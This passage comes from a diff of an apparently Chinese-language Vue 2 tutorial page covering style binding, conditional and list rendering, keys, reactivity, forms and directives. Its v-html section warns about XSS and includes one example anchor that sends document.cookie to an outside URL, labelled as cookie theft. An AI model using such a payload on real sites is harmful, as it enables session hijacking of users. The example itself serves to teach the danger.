+</ol>
+<h2 id="綁定樣式"><a href="#綁定樣式" class="headerlink" title="綁定樣式"></a>綁定樣式</h2><h3 id="class樣式"><a href="#class樣式" class="headerlink" title="class樣式"></a>class樣式</h3><ul>
+<li>語法：<code>:class=&quot;xxx&quot;</code>，<code>xxx</code>可以是字符串、數組和對象</li>
+</ul>
+<ol>
+<li>字符串寫法<ul>
+<li>適用於：類名不確定，要動態獲取  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 字符串寫法，適用於：樣式的類名不確定，需要動態決定 --&gt;</span><br><span class="line">&lt;div :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mood</span>: <span class="string">&#x27;normal&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>數組寫法<ul>
+<li>適用於：要綁定多個樣式，個數確定，名字也確定  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 數組寫法，適用於：要綁定的樣式個數不確定、名字也不確定 --&gt;</span><br><span class="line">&lt;div :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">classArr</span>:[<span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span>, <span class="string">&#x27;a3&#x27;</span>],</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>對象寫法<ul>
+<li>適用於：要綁定多個樣式，個數不確定、名字也不確定  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 對象寫法，適用於：要昂丁的樣式個數確定、名字也確定，但要動態決定用不用 --&gt;</span><br><span class="line">&lt;div :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">classObj</span>:&#123; <span class="attr">a1</span>:<span class="literal">false</span>, <span class="attr">a2</span>:<span class="literal">false</span>, <span class="attr">a3</span>:<span class="literal">true</span> &#125;,</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="style樣式"><a href="#style樣式" class="headerlink" title="style樣式"></a>style樣式</h3><ol>
+<li>對象寫法<ul>
+<li>語法：<code>:style=&quot;&#123;fontSize: xxx&#125;&quot;</code> 其中<code>xxx</code>是動態值  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 對象寫法 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">styleObj</span>:&#123;</span><br><span class="line">    <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">    <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>數組寫法<ul>
+<li>語法：<code>:style=&quot;[a,b]&quot;</code> 其中a,b是樣式對象  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 數組寫法，不常用 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">styleArr</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="條件渲染"><a href="#條件渲染" class="headerlink" title="條件渲染"></a>條件渲染</h2><ol>
+<li><p><code>v-if</code></p>
+<ul>
+<li>適用於：切換頻率比較低的場景</li>
+<li>特點：<font color="#f54747">不展示的DOM元素會被直接移除</font></li>
+<li>注意：<code>v-if</code>可以和<code>v-else-if</code>, <code>v-else</code>一起使用，但要求結構不能被「打斷」</li>
+<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;haha&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><code>v-show</code></p>
+<ul>
+<li>適用於：切換頻率較高的場景</li>
+<li>特點：不展示的DOM元素不會被移除，僅僅是使用樣式隱藏</li>
+<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 v-show=&quot;false&quot;&gt;Hello&lt;/h2&gt;</span><br><span class="line">&lt;h2 v-show=&quot;1 === 1&quot;&gt;Hello&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>備註：使用<code>v-if</code>時，元素可能無法獲取到，而使用<code>v-show</code>一定可以獲取到</li>
+</ol>
+<h2 id="列表渲染-v-for"><a href="#列表渲染-v-for" class="headerlink" title="列表渲染 v-for"></a>列表渲染 <code>v-for</code></h2><ol>
+<li>簡介：<ul>
+<li>用於展示列表數據</li>
+<li>可遍歷：數組、對象、字符串、指定次數</li>
+<li>語法：<code>v-for=&quot;(item, index) in obj&quot; :key=&quot;index&quot;</code></li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>遍歷數組 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; -- &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">persons</span>:[</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">19</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;John&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>, <span class="attr">age</span>:<span class="number">21</span>&#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>遍歷對象 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(value,k) in car&quot; :key=&quot;k&quot;&gt;</span><br><span class="line">    &#123;&#123;k&#125;&#125; -- &#123;&#123;value&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;     </span><br><span class="line">        <span class="attr">car</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Porsche&#x27;</span>,</span><br><span class="line">            <span class="attr">price</span>:<span class="string">&#x27;10M&#x27;</span>,</span><br><span class="line">            <span class="attr">color</span>:<span class="string">&#x27;Black&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>遍歷字符串（少用） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(char,index) in str&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;char&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">str</span>:<span class="string">&#x27;Hello&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>遍歷指定次數（少用） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(number,index) in 10&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;number&#125;&#125; - &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="key的內部原理"><a href="#key的內部原理" class="headerlink" title="key的內部原理"></a>key的內部原理</h2><ol>
+<li>虛擬DOM中<code>key</code>的作用：<ul>
+<li>key是虛擬DOM對象的標識，當狀態中的數據發生變化時，Vue會根據「新數據」生成「新的虛擬DOM」</li>
+<li>隨後Vue進行「新虛擬DOM」與「舊虛擬DOM」的差異比較(diff Algorithm)</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p>Diff Algorithm 對比規則：</p>
+<ul>
+<li><p>舊虛擬DOM中<font color="#f54747">找到</font>與新虛擬DOM相同的<code>key</code></p>
+<ol>
+<li>若虛擬DOM中內容<font color="#f54747">沒變</font>，直接使用之前的真實DOM</li>
+<li>若虛擬DOM中內容<font color="#f54747">有變</font>，則聲稱新的真實DOM，隨後替換掉頁面中之前的真實DOM</li>
+</ol>
+</li>
+<li><p>舊虛擬DOM中<font color="#f54747">找不到</font>與新虛擬DOM相同的<code>key</code></p>
+<ul>
+<li>創建新的真實DOM，隨後渲染到頁面</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p>用<code>index</code>作為<code>key</code>可能引發的問題：</p>
+<ol>
+<li><p>若對數據進行：逆序添加、逆序刪除等破壞順序的操作：</p>
+<ul>
+<li>會產生沒有必要的真實DOM更新 =&gt; 界面效果沒問題，但效率低</li>
+</ul>
+</li>
+<li><p>如果結構中還包括輸入類的DOM：</p>
+<ul>
+<li>會產生錯誤DOM更新 =&gt; 介面有問題</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>開發中如何選擇<code>key</code>：<ol>
+<li>最好使用每條數據的唯一標識作為<code>key</code>，比如<code>id</code>、手機號碼、身分證號碼、學生證號碼等唯一值</li>
+<li>如果<font color="#f54747">不存在對數據的逆序添加、逆序刪除等破壞順序的操作，僅用於渲染列表用於展示</font><ul>
+<li>使用<code>index</code>作為<code>key</code>是沒有問題的</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="Vue監測原理"><a href="#Vue監測原理" class="headerlink" title="Vue監測原理"></a>Vue監測原理</h2><ol>
+<li><p>更新時的問題：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;p.id&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>當數據是保存在一個對象裡，如果直接修改對象數據，則頁面也會更新數據</p>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然而，如果修改整個對象，則頁面<font color="#f54747">不會更新數據</font></p>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>] = &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">50</span>&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>Vue監測對象中的數據：<ul>
+<li>通過<code>setter</code>實現監視，且要再<code>new Vue</code>時就傳入要監測的數據</li>
+<li>對象中後追加的屬性，Vue默認不做響應式處理<font color="#f54747">（後追加的屬性並沒有添加<code>setter</code>）</font></li>
+<li>如需要給後添加的屬性做響應式，則需要使用一下API：<ol>
+<li><code>Vue.set(target, key, value)</code></li>
+<li><code>vm.$set(target, key, value)</code></li>
+</ol>
+</li>
+<li>具體代碼：  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">addGender</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">set</span>(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">        <span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>Vue監測數組中的數據：<ul>
+<li>通過包裹數組更新元素的方法實現，本質包裹裡就做了兩件事：<ol>
+<li>調用原生對應的方法對數組進行更新</li>
+<li>重新解析模板，進而更新頁面</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>在Vue修改數組中的某個元素一定要用如下方法：<ul>
+<li>使用以下API：<code>push()</code>, <code>pop()</code>, <code>shift()</code>, <code>unshift()</code>, <code>splice()</code>, <code>sort()</code>, <code>reverse()</code></li>
+<li><code>Vue.set()</code> 或 <code>vm.$set</code></li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>備註：<font color="#f54747"><code>Vue.set()</code>和<code>vm.$set</code>不可以給<code>vm</code>或<code>vm</code>的跟數據對象 添加屬性！！！</font></li>
+</ol>
+<h2 id="收集表單數據"><a href="#收集表單數據" class="headerlink" title="收集表單數據"></a>收集表單數據</h2><ol>
+<li><p>Vue對輸入框數據的收集：</p>
+<ol>
+<li><p><code>&lt;input type=&quot;text&quot;/&gt;</code></p>
+<ul>
+<li><code>v-model</code>收集的是<code>value</code>值，而用戶輸入的就是<code>value</code>值</li>
+</ul>
+</li>
+<li><p><code>&lt;input type=&quot;radio&quot;/&gt;</code></p>
+<ul>
+<li><code>v-model</code>收集的是<code>value</code>值，而要給標籤配置<code>value</code>值</li>
+</ul>
+</li>
+<li><p><code>&lt;input type=&quot;checkbox&quot;/&gt;</code></p>
+<ul>
+<li><p>如果沒有配置<code>input</code>的<code>value</code>屬性</p>
+<ul>
+<li>則<code>v-model</code>收集的是<code>checked</code>的布爾值</li>
+</ul>
+</li>
+<li><p>如果有配置<code>input</code>的<code>value</code>屬性</p>
+<ol>
+<li><code>v-model</code>的初始值是非數組，那麼收集的就是<code>checked</code>的布爾值</li>
+<li><code>v-model</code>的初始值是數組，那麼收集的就是<code>value</code>組成的數組</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><code>v-model</code>的三個修飾符：<ol>
+<li><code>lazy</code>：失去焦點再收集數據</li>
+<li><code>number</code>：輸入字符串轉為有效數字</li>
+<li><code>trim</code>：輸入收尾空格過濾</li>
+</ol>
+<ul>
+<li>語法：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 失去焦點時，userInfo.other收集輸入框數據 --&gt;</span><br><span class="line">&lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="過濾器（已刪除）"><a href="#過濾器（已刪除）" class="headerlink" title="過濾器（已刪除）"></a>過濾器（已刪除）</h2><ol>
+<li>定義：對要顯示的數據進行特定的格式化後再顯示</li>
+</ol>
+<ol>
+<li>語法：<ol>
+<li>註冊過濾器：<code>Vue.filter(name, callback)</code> 或 <code>new Vue(filters:&#123;&#125;)</code></li>
+<li>使用過濾器：<code>&#123;&#123;xxx | filterName&#125;&#125;</code> 或 <code>v-bind:屬性=&quot;xxx | filterName&quot;</code></li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>備註：<ol>
+<li>過濾器可以接受額外參數，多個過濾器也可以串連</li>
+<li>並沒有改變原本的數據，會產生新的對應數據</li>
+</ol>
+</li>
+</ol>
+<h2 id="Vue內置指令"><a href="#Vue內置指令" class="headerlink" title="Vue內置指令"></a>Vue內置指令</h2><ol>
+<li><p><code>v-text</code></p>
+<ul>
+<li><p>作用：向其所在的節點中渲染文本內容</p>
+</li>
+<li><p>與插值語法的區別：<font color="#f54747"><code>v-text</code>會替換掉節點中的內容，插值語法則不會</font></p>
+</li>
+<li><p>具體代碼：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-text=&quot;&#x27;Hello, &#x27; + name&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        name:&#x27;Donald&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><code>v-html</code></p>
+<ul>
+<li><p>作用：向指定節點中渲染包含html結構的內容</p>
+</li>
+<li><p>與插值語法的區別：</p>
+<ol>
+<li><code>v-html</code>會替換掉節點中的所有內容</li>
+<li><code>v-html</code>可以識別<code>html</code>結構</li>
+</ol>
+</li>
+<li><p><font color="#f54747">嚴重注意：v-html有安全性問題：</font></p>
+<ol>
+<li>在網站上動態渲任意HTML是非常危險的，容易導致XSS攻擊</li>
+<li>一定要在可信的內容上使用v-html，永遠不要再用戶提交的內容上使用</li>
+</ol>
+</li>
+<li><p>具體代碼：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        str: &#x27;&lt;h3&gt;Hello World&lt;/h3&gt;&#x27;,</span><br><span class="line">        // 竊取用戶cookie</span><br><span class="line">        str2: &#x27;&lt;a href=javascript:location.href=&quot;http://www.google.com?&quot; + document.cookie&gt;Click Me&lt;/a&gt;&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><code>v-cloak</code></p>
+<ul>
+<li><p>作用：</p>
+<ul>
+<li>本質是一個特殊屬性，Vue實例創建完畢並接管容器後，會刪除<code>v-cloak</code>屬性</li>
+<li>使用css配合<code>v-cloak</code>可以解決網速慢時頁面展示出的<code>&#123;&#123;xxx&#125;&#125;</code>問題</li>
+</ul>
+</li>
+<li><p>具體代碼：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    [v-cloak]&#123;</span><br><span class="line">        /* 避免出現的樣式丟失問題 */</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><code>v-once</code></p>
+<ul>
+<li><p>作用：</p>
+<ul>
+<li><code>v-once</code>所在節點在初次動態渲染後，就視為靜態內容了</li>
+<li>以後數據的改變不會引起<code>v-once</code>所在結構的更新，可以用於優化性能</li>
+</ul>
+</li>
+<li><p>具體代碼：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;變成靜態內容 --&gt;</span><br><span class="line">&lt;h2 v-once&gt;initialized value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><code>v-pre</code></p>
+<ul>
+<li><p>作用：</p>
+<ul>
+<li>跳過其所在節點的編譯過程</li>
+<li>可以利用它跳過：沒有使用指令語法、沒有使用插值語法的節點，會加快編譯</li>
+</ul>
+</li>
+<li><p>具體代碼：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;被跳過，不會動態渲染 --&gt;</span><br><span class="line">&lt;h2 v-pre&gt;current value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="自定義指令"><a href="#自定義指令" class="headerlink" title="自定義指令"></a>自定義指令</h3><ol>
+<li><p>定義語法：</p>
+<ol>
+<li><p>局部指令：</p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>:&#123;指令名:配置對象&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="title function_">directives</span>(<span class="params"></span>)&#123;指令名:回調函數&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>案例：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 案例: 定義一個v-enlarge指令，和v-text功能類似，會把綁定的數值放大10倍 --&gt;</span><br><span class="line">&lt;h2&gt;10n = &lt;span v-enlarge=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        enlarge(element,binding)&#123;</span><br><span class="line">            element.innerText = binding.value * 10</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>全局指令：</p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 配置對象)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 回調函數)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>配置對象中常用的3個回調：</p>
+<ol>
+<li><code>bind</code>：指令與元素成功綁定時</li>
+<li><code>inserted</code>：指令所在元素被插入頁面時</li>
+<li><code>update</code>：指令所在模板結構被重新解析時</li>
+</ol>
+<ul>
+<li>案例：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 需求2: 定義一個v-fbind指令，和v-bind功能類似，但可以讓所綁定的input元素默認獲取焦點 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        fbind:&#123;</span><br><span class="line">            // 指令與元素成功綁定時（初次）</span><br><span class="line">            bind(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在元素在插入頁面時</span><br><span class="line">            inserted(element, binding)&#123;</span><br><span class="line">                element.focus()</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在的模板被重新解析時</span><br><span class="line">            update(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
